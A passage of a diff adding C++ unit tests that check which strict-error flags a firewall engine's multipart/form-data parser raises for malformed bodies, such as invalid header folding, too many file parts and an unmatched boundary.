+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataBefore));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataAfter));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::HeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::LfLine));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::MissingSemicolon));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidQuoting));
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::InvalidPart));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidHeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::FileLimitExceeded));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::UnmatchedBoundary));
+
+    auto& name_value_map = multi_part.getNameValue();
+    auto& name_value_linked = multi_part.getNameValueLinked();
+    EXPECT_EQ(name_value_map.size(), 1);
+    EXPECT_EQ(name_value_linked.size(), 1);
+    EXPECT_EQ(name_value_map.find("foo1")->second, "bar1\r\n");
+    EXPECT_EQ(name_value_linked[0].first, "foo1");
+    EXPECT_EQ(name_value_linked[0].second, "bar1\r\n");
+  }
+
+  // ErrorType::InvalidHeaderFolding
+  {
+    Wge::Common::Ragel::MultiPart multi_part;
+    multi_part.init(R"(multipart/form-data; boundary=--helloworld)",
+                    R"(----helloworld)"
+                    "\r\n"
+                    "content-disposition: form-data; name=foo1\r\n"
+                    "filename=hello\r\n"
+                    "header1: value1\r\n"
+                    "\r\n"
+                    "bar1\r\n"
+                    R"(----helloworld--)");
+    auto error = multi_part.getError();
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::MultipartStrictError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::ReqbodyProcessorError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryQuoted));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryWhitespace));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataBefore));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataAfter));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::HeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::LfLine));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::MissingSemicolon));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidQuoting));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidPart));
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::InvalidHeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::FileLimitExceeded));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::UnmatchedBoundary));
+
+    auto& name_value_map = multi_part.getNameValue();
+    auto& name_value_linked = multi_part.getNameValueLinked();
+    EXPECT_EQ(name_value_map.size(), 1);
+    EXPECT_EQ(name_value_linked.size(), 1);
+    EXPECT_EQ(name_value_map.find("foo1")->second, "bar1\r\n");
+    EXPECT_EQ(name_value_linked[0].first, "foo1");
+    EXPECT_EQ(name_value_linked[0].second, "bar1\r\n");
+  }
+
+  // ErrorType::FileLimitExceeded
+  {
+    Wge::Common::Ragel::MultiPart multi_part;
+    multi_part.init(R"(multipart/form-data; boundary=--helloworld)",
+                    "----helloworld\r\n"
+                    "content-disposition: form-data; name=file1; filename=hello1\r\n"
+                    "\r\n"
+                    "world\r\n"
+                    "----helloworld\r\n"
+                    "content-disposition: form-data; name=file2; filename=hello2\r\n"
+                    "\r\n"
+                    "world\r\n"
+                    "----helloworld\r\n"
+                    "content-disposition: form-data; name=file2; filename=hello3\r\n"
+                    "\r\n"
+                    "world\r\n"
+                    "----helloworld--",
+                    2);
+    auto error = multi_part.getError();
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::MultipartStrictError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::ReqbodyProcessorError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryQuoted));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryWhitespace));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataBefore));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataAfter));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::HeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::LfLine));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::MissingSemicolon));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidQuoting));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidPart));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidHeaderFolding));
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::FileLimitExceeded));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::UnmatchedBoundary));
+  }
+
+  // ErrorType::UnmatchedBoundary
+  {
+    Wge::Common::Ragel::MultiPart multi_part;
+    multi_part.init(R"(multipart/form-data; boundary=--helloworld)",
+                    "----helloworld2\r\n"
+                    "content-disposition: form-data; name=hello\r\n"
+                    "\r\n"
+                    "world\r\n"
+                    "----helloworld2--");
+    auto error = multi_part.getError();
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::MultipartStrictError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::ReqbodyProcessorError));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryQuoted));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::BoundaryWhitespace));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataBefore));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::DataAfter));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::HeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::LfLine));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::MissingSemicolon));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidQuoting));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidPart));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::InvalidHeaderFolding));
+    EXPECT_FALSE(error.get(Wge::MultipartStrictError::ErrorType::FileLimitExceeded));
+    EXPECT_TRUE(error.get(Wge::MultipartStrictError::ErrorType::UnmatchedBoundary));
+  }
+}
